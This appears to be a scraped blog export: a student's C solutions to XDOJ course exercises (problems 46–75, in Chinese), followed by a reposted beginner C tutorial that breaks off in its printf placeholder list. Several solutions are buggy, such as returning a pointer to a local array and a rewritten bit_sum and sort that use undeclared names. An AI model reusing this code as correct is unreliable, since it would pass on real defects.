scanf(&quot;%d %d %d&quot;, &amp;prev, &amp;curr, &amp;next); if ((curr - prev) * (next - curr) &lt; 0) count++; prev = curr, curr = next; } else { scanf(&quot;%d&quot;, &amp;next); if ((curr - prev) * (next - curr) &lt; 0) count++; prev = curr, curr = next; } printf(&quot;%d&quot;, count); return 0;} 46.寻找最大整数_分支结构123456789101112131415161718#include &lt;stdio.h&gt;int main(void) { int num, i; for (i = 0; i &lt; 4; i++) if (i == 1) { scanf(&quot;%d&quot;, &amp;num); continue; } else { int curr; scanf(&quot;%d&quot;, &amp;curr); num = curr &gt; num ? curr : num; } printf(&quot;%d&quot;, num); return 0;} 47.字符处理_分支结构123456789101112131415#include &lt;stdio.h&gt;int main(void) { int ch; ch = getchar(); if (ch &gt;= 65 &amp;&amp; ch &lt;= 90) putchar(ch + 32); else if (ch &gt;= 97 &amp;&amp; ch &lt;= 122) putchar(ch - 32); else putchar(ch); return 0;} 48.成绩分级1_分支结构12345678910111213141516171819#include &lt;stdio.h&gt;int main(void) { int score; scanf(&quot;%d&quot;, &amp;score); if (score &gt;= 90 &amp;&amp; score &lt;= 100) putchar('A'); else if (score &gt;= 80) putchar('B'); else if (score &gt;= 70) putchar('C'); else if (score &gt;= 60) putchar('D'); else if (score &gt;= 0) putchar('E'); return 0;} 49.abc组合1234567891011121314#include &lt;stdio.h&gt;int main(void) { int num, a, b, c; scanf(&quot;%d&quot;, &amp;num); for (a = 0; a &lt;= 9; a++) for (b = 0; b &lt;= 9; b++) for (c = 0; c &lt;= 9; c++) if ((a + c) * 100 + b * 20 + (a + c) == num) printf(&quot;%d %d %d\\n&quot;, a, b, c); return 0;} 50.直角三角形判断_分支结构1234567891011121314151617181920#include &lt;stdio.h&gt;int main(void) { int a[3], i, j, tmp; scanf(&quot;%d %d %d&quot;, &amp;a[0], &amp;a[1], &amp;a[2]); for (i = 0; i &lt; 2; i++) for (j = i + 1; j &lt; 3; j++) if (a[i] &gt; a[j]) tmp = a[i], a[i] = a[j], a[j] = tmp; if (a[0] + a[1] &gt; a[2] &amp;&amp; a[0] + a[2] &gt; a[1] &amp;&amp; a[1] + a[2] &gt; a[0]) if (a[0] * a[0] + a[1] * a[1] == a[2] * a[2]) printf(&quot;%d&quot;, a[0]*a[1]); else printf(&quot;no&quot;); else printf(&quot;no&quot;); return 0;} 51.工资计算_分支结构1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;int main(void) { int num; double res; scanf(&quot;%d&quot;, &amp;num); if (num &gt; 3500) { num -= 3500; if (num &gt; 35000) res = (num - 35000) * 0.7 + 26000 * 0.75 + 4500 * 0.8 + 3000 * 0.9 + 1500 * 0.97; else if (num &gt; 9000) res = (num - 9000) * 0.75 + 4500 * 0.8 + 3000 * 0.9 + 1500 * 0.97; else if (num &gt; 4500) res = (num - 4500) * 0.8 + 3000 * 0.9 + 1500 * 0.97; else if (num &gt; 1500) res = (num - 1500) * 0.9 + 1500 * 0.97; else res = num * 0.97; res += 3500; } else res = num; printf(&quot;%d&quot;, (int)res); return 0;} 52.平均数123456789101112131415#include &lt;stdio.h&gt;int main(void) { int a, i, num; double res; scanf(&quot;%d&quot;, &amp;a); for (i = 0, res = 0; i &lt; a; i++) { scanf(&quot;%d&quot;, &amp;num); res += 1 / (double)a * (double)num; } printf(&quot;%.2lf&quot;, res); return 0;} 第五次上机练习题 难度简单，随便做就行 服务器卡的让人没心情做。。 53.水仙花数水仙花数指大于等于三位的数，如果各位的位数次幂的和等于自身，则称为水仙花数。 要求交一个函数。。就，稍微有点麻烦。本来想用函数中声明函数的奇淫技巧，但是这样就没意思了，所以还是算了。。 12345678910111213141516171819202122232425262728293031323334int function(int a, int b){ /* tmp ：临时变量，用于交换a，b的值 i ：计数变量，用于表示a到b（含a，b）之间的所有数 count ：计数变量，用于存储水仙花数的个数 */ int tmp, i, count; /* 交换a，b的值来确保a&lt;b */ a &gt; b ? tmp = a, a = b, b = tmp : 1; /* 循环，遍历含a，b的在a，b间的所有数 */ for (i = a, count = 0; i &lt;= b; i++) { /* bit ：存储数字i的位数 bit_sum ：存储数字i的各位幂次和 i_cpy ：i的复制，用来参与求i位数的计算，防止i的值改变，影响循环 j ：循环变量，用来参与求i各位幂次和的运算 */ int bit, bit_sum, i_cpy = i, j; /* 计算i的位数，存储到变量bit中 */ for (bit = 1; i_cpy / (int)pow(10, bit) != 0; bit++) ; /* 恢复i_cpy的值为i，以便于参与接下来求i各位幂次和的运算 */ i_cpy = i; /* 计算i的各位幂次和 */ for (j = 0, bit_sum = 0; j &lt; bit; j++) bit_sum += (int)pow(i_cpy % 10, bit), i_cpy /= 10; /* 根据水仙花数的定义（大于等于三位，各位幂次和为其本身）判断i是否为水仙花数 */ if (i == bit_sum &amp;&amp; bit &gt; 2) count++; } return count;} 54.哥德巴赫猜想先吐槽下XDOJ上的歌德巴赫猜想（xswl 思路就是for循环，逐组尝试。注意C语言的模块化思想，设计程序时从抽象到具体。 123456789101112131415161718192021222324#include &lt;stdio.h&gt;int is_prime(int num) { int i, res; for (i = 1, res = 1; i &lt; num; i++) if (num % i == 0 &amp;&amp; i != 1) res = 0; return res;}int main(void) { int a, i, min, max; scanf(&quot;%d&quot;, &amp;a); for (i = 2; i &lt; a; i++) if (is_prime(i) &amp;&amp; is_prime(a - i)) { printf(&quot;%d %d&quot;, i, a - i); break; } return 0;} 55.斐波纳契数列素数判断直接把上面写好的is_prime拿过来，再写个fib，就完成了。 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;int is_prime(int num) { int i, res; for (i = 1, res = 1; i &lt; num; i++) if (num % i == 0 &amp;&amp; i != 1) res = 0; return res;}int fib(int i) { if (i &gt; 2) return fib(i - 1) + fib(i - 2); else return 1;}int main(void) { int num; scanf(&quot;%d&quot;, &amp;num); if (is_prime(fib(num))) printf(&quot;yes&quot;); else printf(&quot;%d&quot;, fib(num)); return 0;} 56.数列求和一个关于斐波那契数列的数列，对其求和。 思路很清晰，就是先用斐波那契数列表示出来这个数列，然后再进行逐项求和运算。 1234567891011121314151617181920#include &lt;stdio.h&gt;double fib(int i) { if (i &gt; 2) return fib(i - 1) + fib(i - 2); else return 1.0;}int main(void) { int i, n; double res; scanf(&quot;%d&quot;, &amp;n); for (i = 0, res = 0; i &lt; n; i++) res += fib(i + 3) / fib(i + 2); printf(&quot;%.2f&quot;, res); return 0;} 57.字符串元素统计注意ASCII码的灵活运用。还有就是ch=getchar()的终止条件不要选错，不然就是死循环了。 123456789101112131415#include &lt;stdio.h&gt;int main(void) { int ch, a = 0, b = 0; while ((ch = getchar()) != EOF &amp;&amp; ch != '\\n') if (ch &gt;= '0' &amp;&amp; ch &lt;= '9') a++; else if ((ch &gt;= 'a' &amp;&amp; ch &lt;= 'z') || (ch &gt;= 'A' &amp;&amp; ch &lt;= 'Z')) b++; printf(&quot;%d,%d&quot;, b, a); return 0;} 58.字符串查找查找字母在字符串中的出现次数。把上面那个题删减一下就行。 123456789101112#include &lt;stdio.h&gt;int main(void) { int ch, c = 0; while ((ch = getchar()) != EOF &amp;&amp; ch != '\\n') if ((ch &gt;= 'a' &amp;&amp; ch &lt;= 'z') || (ch &gt;= 'A' &amp;&amp; ch &lt;= 'Z')) c++; printf(&quot;%d&quot;, c); return 0;} 59.字符串筛选隔一个输出。所以用一个计数器就行了。 12345678910111213141516171819#include &lt;stdio.h&gt;int fun(char *ch) { int i; for (i = 0; *ch != '\\0'; i++) if (i % 2 == 0) putchar(*ch++); else ch++;}int main(void) { char ch[100]; scanf(&quot;%s&quot;, &amp;ch); fun(ch); return 0;} 60.字符串连接不正经解法。别学我（ 正经解法是：读入两个字符串常量，然后存储在res数组中，最后返回它的指针即可。 懒得写了 123456789101112131415161718#include &lt;stdio.h&gt;char *fun(char *a, char *b) { char res[200]; printf(&quot;%s%s&quot;, a, b); return res;}int main(void) { int ch, a[100], b[100], *res, i; scanf(&quot;%s %s&quot;, a, b); fun(a, b); return 0;} 61.整数转换为字符串除了下面的解法，也可以严格按照题目要求来解：gechar读入字符，再输出就行。 12345678910#include &lt;stdio.h&gt;int main(void) { int a; scanf(&quot;%d&quot;, &amp;a); printf(&quot;%d&quot;, a); return 0;} 实在是不知道这题存在的意义。。 62.十六进制转换为十进制如果是十三进制转十进制这样的，就有难度了。。 这个的解法可以参照我前面写的进制转换那篇，回头我也会再写一个更通用的。 12345678910#include &lt;stdio.h&gt;int main(void) { int a; scanf(&quot;%x&quot;, &amp;a); printf(&quot;%d&quot;, a); return 0;} 63.递归数列123456double function(int n) { if (n == 1) return 1.000000; else return 1.000000 / (1.000000 + function(--n));} 64.Fibonacci数列123456789int fib(int n){ if (n == 0) return 7; else if (n == 1) return 11; else return fib(n - 1) + fib(n - 2);} 65.数字处理123456789101112131415161718#include &lt;stdio.h&gt;int bit_sum(int num){ return num&gt;=10?num%10+bit_sum(num/10):num;}int main(void){ int num; scanf(&quot;%d&quot;,&amp;num); while(num&gt;=10) num=bit_sum(num); printf(&quot;%d&quot;,num); return 0;} 66.阶乘计算123456789101112131415161718192021#include &lt;stdio.h&gt;double mul(int num){ if(num&gt;1) return 1.0*num * mul(num-1); else return 1.0;}int main(void){ int m,n,tmp; scanf(&quot;%d %d&quot;,&amp;m,&amp;n); if(m&lt;n) tmp=m,m=n,n=tmp; printf(&quot;%.2f&quot;,mul(m)/mul(n)/mul(m-n)); return 0;} 67.金字塔打印1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;void tow(int ch,int line){ int i; for(i=0;i&lt;line;i++) { /* 1.print space */ for(int j=i;j&lt;line-1;j++) putchar(' '); /* 2.print char */ for(int k=0;k&lt;2*i+1;k++) putchar(k%2==0?ch:' '); /* 3.start a new line */ if(i!=line-1) puts(&quot;&quot;); }}int main(void){ int ch,n; scanf(&quot;%c %d&quot;,&amp;ch,&amp;n); tow(ch,n); return 0;} 68.字符逆序排放12345678910111213#include &lt;stdio.h&gt;int main(void){ int ch[100],i=0; while(ch[i]=getchar(),ch[i]!=EOF&amp;&amp;ch[i]!='\\n') i++; while(i--) putchar(ch[i]); return 0;} 69.素数判断1234567891011121314151617181920#include &lt;stdio.h&gt;int is_prime(int num){ for(int i=2;i&lt;num;i++) if(num%i==0&amp;&amp;num!=2) return 0; return 1;}int main(void){ int num; scanf(&quot;%d&quot;,&amp;num); printf(&quot;%s&quot;,is_prime(num)?&quot;YES&quot;:&quot;NO&quot;); return 0;} 70.调用函数求素数12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int fun(int num, int* arr);int main(void){ int num,i,j=0,arr[64]; scanf(&quot;%d&quot;,&amp;num); printf(&quot;%d\\n&quot;,i=fun(num,arr)); while(i-j) printf(&quot;%d &quot;,arr[j]),j++; return 0;}int fun(int num, int* arr){ int res=0; for(int i=2;i&lt;=num;i++) { int flag=1; if(i==2); else if(i&gt;2) for(int j=2;j&lt;i;j++) if(i%j==0) flag=0; if(flag) *arr++=i,res++; } return res;} 71.函数与数组这题啥也没有，直接提交就行 估计是忘放题了 已经忘了是多少次练习了。。 72.消除类游戏之前写2048的时候写过类似算法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;int main(void){ int arr[30][30], arr_new[30][30]; int m, n, i, j; scanf(&quot;%d %d&quot;, &amp;m, &amp;n); for (i = 0; i &lt; m; i++) for (j = 0; j &lt; n; j++) scanf(&quot;%d&quot;, &amp;arr[i][j]), arr_new[i][j] = arr[i][j]; for (i = 0; i &lt; m; i++) { int flag = 0; for (j = 0; j &lt; n - 1; j++) { if (arr[i][j] == arr[i][j + 1]) flag++; else flag = 0; if (flag &gt;= 2) arr_new[i][j - 1] = arr_new[i][j] = arr_new[i][j + 1] = 0; } } for (j = 0; j &lt; n; j++) { int flag = 0; for (i = 0; i &lt; m - 1; i++) { if (arr[i][j] == arr[i + 1][j]) flag++; else flag = 0; if (flag &gt;= 2) arr_new[i - 1][j] = arr_new[i][j] = arr_new[i + 1][j] = 0; } } for (i = 0; i &lt; m; i++) { for (j = 0; j &lt; n; j++) printf(&quot;%d &quot;, arr_new[i][j]); puts(&quot;&quot;); } return 0;} 稍微解释下吧。一共四个for循环，首尾两个负责输入输出，中间两个分别用于处理每一行和每一列。 处理思路很简单，参考第一题。 代码很丑，本想重构一下，抽个函数出来，结果让指针绊住了。。还是学艺不精.jpg 73.数字排序1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int bit_sum(int num);int compare(int a, int b);int main(void){ int i, j, n, *arr, tmp; scanf(&quot;%d&quot;, &amp;n); arr = (int *)malloc(sizeof(int) * n); for (i = 0; i &lt; n; i++) scanf(&quot;%d&quot;, &amp;arr[i]); for (i = 0; i &lt; n - 1; i++) for (j = i + 1; j &lt; n; j++) if (compare(arr[i], arr[j]) &lt; 0||(compare(arr[i], arr[j]) == 0&amp;&amp;arr[i] &gt; arr[j])) tmp = arr[i], arr[i] = arr[j], arr[j] = tmp; for (i = 0; i &lt; n; i++) printf(&quot;%d %d\\n&quot;, arr[i], bit_sum(arr[i])); return 0;}int bit_sum(int num){ int res = 0; while (num) res += num % 10, num /= 10; return res;}int compare(int a, int b){ return bit_sum(a) &gt; bit_sum(b)?1:bit_sum(a) == bit_sum(b)?0:-1;} bit_sum是计算各位和的函数，compare是比较两个数各位和大小的函数。逻辑在主程序中完成。 74.矩阵1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void sort(int *arr, int len);int main(void){ int n, *arr, *res, i, j; scanf(&quot;%d&quot;, &amp;n); res = (int *)malloc(sizeof(int) * n * 2 + 2); arr = (int *)malloc(sizeof(int) * n * n); for (i = 0; i &lt; n * n; i++) scanf(&quot;%d&quot;, &amp;arr[i]); for (i = 0; i &lt; n; i++) for (res[i] = 0, j = 0; j &lt; n; j++) res[i] += arr[i * n + j]; for (; i &lt; n * 2; i++) for (res[i] = 0, j = 0; j &lt; n; j++) res[i] += arr[i - n + j * n]; for (j = res[i] = res[i + 1] = 0; j &lt; n; j++) { res[i] += arr[j + j * n]; res[i + 1] += arr[n - 1 - j + j * n]; } sort(res, n * 2 + 2); for (i = 0; i &lt; n * 2 + 2; i++) printf(&quot;%d &quot;, res[i]); return 0;}void sort(int *arr, int len){ int i, j, tmp; for (i = 0; i &lt; len - 1; i++) for (j = i + 1; j &lt; len; j++) if (arr[i] &lt; arr[j]) tmp = arr[i], arr[i] = arr[j], arr[j] = tmp;} 大概算了一下规律，然后用一维数组解决了。 比较有意思的一个是，我们可以把这个sort函数改进一下，变成一个更通用的排序函数。这样，上一个题也能用它解决了。 上代码： 12345678910void sort(int *arr, int len,int (*cmp)(int a,int b)){ int exchange(int *a,int *b){int i;i=*a,*a=*b,*b=i;} int i, j, tmp; for (i = 0; i &lt; len - 1; i++) for (j = i + 1; j &lt; len; j++) if (arr[i] &lt; arr[j]) exchange(&amp;arr[i], &amp;arr[j]);} 这里的函数嵌套是C语言支持但不推荐的特性。我用gcc可以编译。 用它来解决上一题： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int compare(int a, int b);void sort(int *arr, int len,int (*cmp)(int a,int b));int bit_sum(int num){return res&gt;0?res%10+bit_sum(res/10):0;}int main(void){ int i, j, n, *arr, tmp; scanf(&quot;%d&quot;, &amp;n); arr = (int *)malloc(sizeof(int) * n); for (i = 0; i &lt; n; i++) scanf(&quot;%d&quot;, &amp;arr[i]); sort(arr, n, cmp_bit_sum); for (i = 0; i &lt; n; i++) printf(&quot;%d %d\\n&quot;, arr[i], bit_sum(arr[i])); return 0;}int cmp_bit_sum(int a, int b){ return bit_sum(a) &gt; bit_sum(b)?1:bit_sum(a) == bit_sum(b)?0:-1;}void sort(int *arr, int len,int (*cmp)(int a,int b)){ int exchange(int *a,int *b){int i;i=*a,*a=*b,*b=i;} int i, j; for (i = 0; i &lt; len - 1; i++) for (j = i + 1; j &lt; len; j++) if (arr[i] &lt; arr[j]) exchange(&amp;arr[i], &amp;arr[j]);} 75.回文数123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;int is_rev(int num);int bit_sum(int num);int get_bit(int num, int bit){ int xpow(int a, int b) { return b &gt; 0 ? a * xpow(a, b - 1) : 1; } return (num % (xpow(10, bit)) - num % (xpow(10, bit - 2))) / xpow(10, bit - 1);}int main(void){ int num; scanf(&quot;%d&quot;, &amp;num); if (is_rev(num)) printf(&quot;%d&quot;, bit_sum(num)); else printf(&quot;no&quot;); return 0;}int is_rev(int num){ int origin = num, bit = 0, i, end = 0; if (num == 0) return 1; else while (bit++, num /= 10); num = origin; for (i = 1, end = bit % 2 == 0 ? bit / 2 : (bit - 1) / 2; i &lt;= end; i++) if (get_bit(num, i) != get_bit(num, bit - i + 1)) return 0; return 1;}int bit_sum(int num){ int res = 0; while (res += num % 10, num /= 10); return res;} 这题思路很多，愿意的话也可以用字符串处理来完成。 总是自己写pow是因为我这边本地环境里pow好像是坏的。。","link":"/2021/09/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C%C2%B7C++/XDOJ-archive/"},{"title":"《C语言入门教程》阮一峰","text":"原文地址：https://www.ruanyifeng.com/blog/2021/09/c-language-tutorial.html我把这些都转载到这里了 C 语言简介历史C 语言最初是作为 Unix 系统的开发工具而发明的。 1969年，美国贝尔实验室的肯·汤普森（Ken Thompson）与丹尼斯·里奇（Dennis Ritchie）一起开发了 Unix 操作系统。Unix 是用汇编语言写的，无法移植到其他计算机，他们决定使用高级语言重写。但是，当时的高级语言无法满足他们的要求，汤普森就在 BCPL 语言的基础上发明了 B 语言。 1972年，丹尼斯·里奇和布莱恩·柯林汉（Brian Kernighan）又在 B 语言的基础上重新设计了一种新语言，这种新语言取代了 B 语言，所以称为 C 语言。 1973年，整个 Unix 系统都使用 C 语言重写。此后，这种语言开始快速流传，广泛用于各种操作系统和系统软件的开发。 1988年，美国国家标准协会（ANSI）正式将 C 语言标准化，标志着 C 语言开始稳定和规范化。 几十年后的今天，C 语言依然是最广泛使用、最流行的系统编程语言之一，Unix 和 Linux 系统现在还是使用 C 语言开发。 C 语言的特点C 语言能够长盛不衰、广泛应用，主要原因是它有一些鲜明的特点。 （1）低级语言 C 语言能够直接操作硬件、管理内存、跟操作系统对话，这使得它是一种非常接近底层的语言，也就是低级语言，非常适合写需要跟硬件交互、有极高性能要求的程序。 （2）可移植性 C 语言的原始设计目的，是将 Unix 系统移植到其他计算机架构。这使得它从一开始就非常注重可移植性，C 程序可以相对简单地移植到各种硬件架构和操作系统。 除了计算机，C 语言现在还是嵌入式系统的首选编程语言，汽车、照相机、家用电器等设备的底层系统都是用 C 语言编程，这也是因为它良好的可移植性。 （3）简单性 C 语言的语法相对简单，语法规则不算太多，也几乎没有语法糖。一般来说，如果两个语法可以完成几乎相同的事情，C 语言就只会提供一种，这样大大减少了语言的复杂性。 而且，C 语言的语法都是基础语法，不提供高级的数据结构，比如 C 语言没有“类”（class），复杂的数据结构都需要自己构造。 （4）灵活性 C 语言对程序员的限制很少。它假设程序员知道自己在干嘛，不会限制你做各种危险的操作，你干什么都可以，后果也由自己负责。 C 语言的哲学是“信任程序员，不要妨碍他们做事”。比如，它让程序员自己管理内存，不提供内存自动清理功能。另外，也不提供类型检查、数组的负索引检查、指针位置的检查等保护措施。 表面上看，这似乎很危险，但是对于高级程序员来说，却有了更大的编程自由。不过，这也使得 C 语言的 debug 不太容易。 （5）总结 上面这些特点，使得 C 语言可以写出性能非常强、完全发挥硬件潜力的程序，而且 C 语言的编译器实现难度相对较低。但是另一方面，C 语言代码容易出错，一般程序员不容易写好。 此外，当代很多流行语言都是以 C 语言为基础，比如 C++、Java、C#、JavaScript 等等。学好 C 语言有助于对这些语言加深理解。 C 语言的版本历史上，C 语言有过多个版本。 （1）K＆R C K&amp;R C指的是 C 语言的原始版本。1978年，C 语言的发明者丹尼斯·里奇（Dennis Ritchie）和布莱恩·柯林（Brian Kernighan）合写了一本著名的教材《C 编程语言》（The C programming language）。由于 C 语言还没有成文的语法标准，这本书就成了公认标准，以两位作者的姓氏首字母作为版本简称“K&amp;R C”。 （2）ANSI C（又称 C89 或 C90） C 语言的原始版本非常简单，对很多情况的描述非常模糊，加上 C 语法依然在快速发展，要求将 C 语言标准化的呼声越来越高。 1989年，美国国家标准协会（ANSI）制定了一套 C 语言标准。1990年，国际标准化组织（ISO）通过了这个标准。它被称为“ANSI C”，也可以按照发布年份，称为“C89 或 C90”。 （3）C95 1995年，美国国家标准协会对1989年的那个标准，进行了补充，加入多字节字符和宽字符的支持。这个版本称为 C95。 （4）C99 C 语言标准的第一次大型修订，发生在1999年，增加了许多语言特性，比如双斜杠（//）的注释语法。这个版本称为 C99，是目前最流行的 C 版本。 （5）C11 2011年，标准化组织再一次对 C 语言进行修订，增加了 Unicode 和多线程的支持。这个版本称为 C11。 （6）C17 C11 标准在2017年进行了修补，但发布是在2018年。新版本只是解决了 C11 的一些缺陷，没有引入任何新功能。这个版本称为 C17。 （7）C2x 标准化组织正在讨论 C 语言的下一个版本，据说可能会在2023年通过，到时就会称为 C23。 C 语言的编译C 语言是一种编译型语言，源码都是文本文件，本身无法执行。必须通过编译器，生成二进制的可执行文件，才能执行。编译器将代码从文本翻译成二进制指令的过程，就称为编译阶段，又称为“编译时”（compile time），跟运行阶段（又称为“运行时”）相区分。 目前，最常见的 C 语言编译器是自由软件基金会推出的 GCC 编译器，它可以免费使用。本书也使用这个编译器。Linux 和 Mac 系统可以直接安装 GCC，Windows 系统可以安装 MinGW。但是，也可以不用这么麻烦，网上有在线编译器，能够直接在网页上模拟运行 C 代码，查看结果，下面就是两个这样的工具。 CodingGround: https://tutorialspoint.com/compile_c_online.php OnlineGDB: https://onlinegdb.com/online_c_compiler 本书的例子都使用 GCC 在命令行进行编译。 Hello World 示例C 语言的源代码文件，通常以后缀名.c结尾。下面是一个简单的 C 程序hello.c。它就是一个普通的文本文件，任何文本编译器都能用来写。 123456#include &lt;stdio.h&gt;int main(void) { printf(&quot;Hello World\\n&quot;); return 0;} 上面这个程序的唯一作用，就是在屏幕上面显示“Hello World”。 这里不讲解这些代码是什么意思，只是作为一个例子，让大家看看 C 代码应该怎么编译和运行。假设你已经安装好了 GCC 编译器，可以打开命令行，执行下面的命令。 1gcc hello.c 上面命令使用gcc编译器，将源文件hello.c编译成二进制代码。注意，$是命令行提示符，你真正需要输入的是$后面的部分。 运行这个命令以后，默认会在当前目录下生成一个编译产物文件a.out（assembler output 的缩写，Windows 平台为a.exe）。执行该文件，就会在屏幕上输出Hello World。 12$ ./a.outHello World GCC 的-o参数（output 的缩写）可以指定编译产物的文件名。 1gcc -o hello hello.c 上面命令的-o hello指定，编译产物的文件名为hello（取代默认的a.out）。编译后就会生成一个名叫hello的可执行文件，相当于为a.out指定了名称。执行该文件，也会得到同样的结果。 12$ ./helloHello World GCC 的-std=参数（standard 的缩写）还可以指定按照哪个 C 语言的标准进行编译。 1gcc -std=c99 hello.c 上面命令指定按照 C99 标准进行编译。 注意，-std后面需要用=连接参数，而不是像上面的-o一样用空格，并且=前后也不能有多余的空格。 C 语言基本语法语句C 语言的代码由一行行语句（statement）组成。语句就是程序执行的一个操作命令。C 语言规定，语句必须使用分号结尾，除非有明确规定可以不写分号。 1int x = 1; 上面就是一个变量声明语句，声明整数变量x，并且将值设为1。 多个语句可以写在一行。 1int x; x = 1; 上面示例是两个语句写在一行。所以，语句之间的换行符并不是必需的，只是为了方便阅读代码。 一个语句也可以写成多行，这时就要依靠分号判断语句在哪一行结束。 12345int x;x=1; 上面示例中，第二个语句x = 1;被拆成了四行。编译器会自动忽略代码里面的换行。 单个分号也是有效语句，称为“空语句”，虽然毫无作用。 1; 表达式C 语言的各种计算，主要通过表达式完成。表达式（expression）是一个计算式，用来获取值。 11 + 2 上面代码就是一个表达式，用来获取1 + 2这个算术计算的结果。 表达式加上分号，也可以成为语句，但是没有实际的作用。 128;3 + 4; 上面示例是两个表达式，加上分号以后成为语句。 表达式与语句的区别主要是两点： 语句可以包含表达式，但是表达式本身不构成语句。 表达式都有返回值，语句不一定有。因为语句用来执行某个命令，很多时候不需要返回值，比如变量声明语句（int x = 1）就没有返回值。 语句块C 语言允许多个语句使用一对大括号{}，组成一个块，也称为复合语句（compounded statement）。在语法上，语句块可以视为多个语句组成的一个复合语句。 1234{ int x; x = 1;} 上面示例中，大括号形成了一个语句块。 大括号的结尾不需要添加分号。 空格C 语言里面的空格，主要用来帮助编译器区分语法单位。如果语法单位不用空格就能区分，空格就不是必须的，只是为了增加代码的可读性。 123int x = 1;// 等同于int x=1; 上面示例中，赋值号（=）前后有没有空格都可以，因为编译器这里不借助空格，就能区分语法单位。 语法单位之间的多个空格，等同于单个空格。 1int x = 1; 上面示例中，各个语法单位之间的多个空格，跟单个空格的效果是一样的。 空格还用来表示缩进。多层级的代码有没有缩进，其实对于编译器来说并没有差别，没有缩进的代码也是完全可以运行的。强调代码缩进，只是为了增强代码可读性，便于区分代码块。 大多数 C 语言的风格要求是，下一级代码比上一级缩进4个空格。为了书写的紧凑，本书采用缩写两个空格。 1234567// 缩进四个空格if (x &gt; 0) printf(&quot;positive\\n&quot;);// 缩进两个空格if (x &gt; 0) printf(&quot;positive\\n&quot;); 只包含空格的行被称为空白行，编译器会完全忽略该行。 注释注释是对代码的说明，编译器会忽略注释，也就是说，注释对实际代码没有影响。 C 语言的注释有两种表示方法。第一种方法是将注释放在/*...*/之间，内部可以分行。 12345/* 注释 *//* 这是一行注释*/ 这种注释可以插在行内。 1int open(char* s /* file name */, int mode); 上面示例中，/* file name */用来对函数参数进行说明，跟在它后面的代码依然会有效执行。 这种注释一定不能忘记写结束符号*/，否则很容易导致错误。 1234printf(&quot;a &quot;); /* 注释一printf(&quot;b &quot;);printf(&quot;c &quot;); /* 注释二 */printf(&quot;d &quot;); 上面示例的原意是，第一行和第三行代码的尾部，有两个注释。但是，第一行注释忘记写结束符号，导致注释一延续到第三行结束。 第二种写法是将注释放在双斜杠//后面，从双斜杠到行尾都属于注释。这种注释只能是单行，可以放在行首，也可以放在一行语句的结尾。这是 C99 标准新增的语法。 123// 这是一行注释int x = 1; // 这也是注释 不管是哪一种注释，都不能放在双引号里面。双引号里面的注释符号，会成为字符串的一部分，解释为普通符号，失去注释作用。 1printf(&quot;// hello /* world */ &quot;); 上面示例中，双引号里面的注释符号，都会被视为普通字符，没有注释作用。 编译时，注释会被替换成一个空格，所以min/* space */Value会变成min Value，而不是minValue。 printf()基本用法本书的示例会大量用到printf()函数，这里先介绍一下这个函数。 printf()的作用是将参数文本输出到屏幕。它名字里面的f代表format（格式化），表示可以定制输出文本的格式。 1printf(&quot;Hello World&quot;); 上面命令会在屏幕上输出一行文字“Hello World”。 printf()不会在行尾自动添加换行符，运行结束后，光标就停留在输出结束的地方，不会自动换行。为了让光标移到下一行的开头，可以在输出文本的结尾，添加一个换行符\\n。 1printf(&quot;Hello World\\n&quot;); 如果文本内部有换行，也是通过插入换行符来实现。 1printf(&quot;Hello\\nWorld\\n&quot;); 上面示例先输出一个Hello，然后换行，在下一行开头输出World，然后又是一个换行。 上面示例也可以写成两个printf()，效果完全一样。 12printf(&quot;Hello\\n&quot;);printf(&quot;World\\n&quot;); printf()是在标准库的头文件stdio.h定义的。使用这个函数之前，必须在源码文件头部引入这个头文件。 12345#include &lt;stdio.h&gt;int main(void) { printf(&quot;Hello World\\n&quot;);} 上面示例中，只有在源码头部加上#include &lt;stdio.h&gt;，才能使用printf()这个函数。#include指令的详细解释，请看《预处理器》一章。 占位符printf()可以在输出文本中指定占位符。所谓“占位符”，就是这个位置可以用其他值代入。 12// 输出 There are 3 applesprintf(&quot;There are %i apples\\n&quot;, 3); 上面示例中，There are %i apples\\n是输出文本，里面的%i就是占位符，表示这个位置要用其他值来替换。占位符的第一个字符一律为百分号%，第二个字符表示占位符的类型，%i表示这里代入的值必须是一个整数。 printf()的第二个参数就是替换占位符的值，上面的例子是整数3替换%i。执行后的输出结果就是There are 3 apples。 常用的占位符除了%i，还有%s表示代入的是字符串。 1printf(&quot;%s will come tonight\\n&quot;, &quot;Jane&quot;); 上面示例中，%s表示代入的是一个字符串，所以printf()的第二个参数就必须是字符串，这个例子是Jane。执行后的输出就是Jane will come tonight。 输出文本里面可以使用多个占位符。 1printf(&quot;%s says it is %i o'clock\\n&quot;, &quot;Ben&quot;, 21); 上面示例中，输出文本%s says it is %i o'clock有两个占位符，第一个是字符串占位符%s，第二个是整数占位符%i，分别对应printf()的第二个参数（Ben）和第三个参数（21）。执行后的输出就是Ben says it is 21 o'clock。 printf()参数与占位符是一一对应关系，如果有n个占位符，printf()的参数就应该有n + 1个。如果参数个数少于对应的占位符，printf()可能会输出内存中的任意值。 printf()的占位符有许多种类，与 C 语言的数据类型相对应。下面按照字母顺序，列出常用的占位符，方便查找，具体含义在后面章节介绍。 %a：浮点数。 %A：浮点数。 %c：字符。 %d：十进制整数。 %e：使用科学计数法的浮点数，指数部分的e为小写。 %E：使用科学计数法的浮点数，指数部分的E为大写。 %i：整数，基本等同于%d。 %f：小数（包含float类型和double类型）。 %g：6个有效数字的浮点数。整数部分一旦超过6位，就会自动转为科学计数法，指数部分的e为小写。 %G：等同于%g，唯一的区别是指数部分的E为大写。 %hd：十进制 short int 类型。 %ho：八进制 short int 类型。 %hx：十六进制 short int 类型。 %hu：unsigned short int 类型。 %ld：十进制 long int 类型。 %lo：八进制 long int 类型。 %lx：十六进制 long int 类型。 %lu：unsigned long int 类型。 %lld：十进制 long long int 类型。 %llo：八进制 long long int 类型。 